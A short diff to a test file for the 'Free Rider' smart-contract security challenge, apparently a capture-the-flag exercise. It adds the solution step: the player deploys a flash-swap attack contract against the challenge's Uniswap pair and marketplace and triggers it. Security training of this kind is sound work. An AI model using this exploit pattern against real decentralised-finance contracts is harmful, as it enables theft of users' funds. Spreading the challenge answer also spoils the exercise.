@@ -106,6 +106,12 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const flashSwapper = await (await ethers.getContractFactory('FreeRiderFlashSwapper', player)).deploy(
+            uniswapPair.address,
+            marketplace.address,
+            devsContract.address
+        );
+        await flashSwapper.flashSwap();
     });
 
     after(async function () {
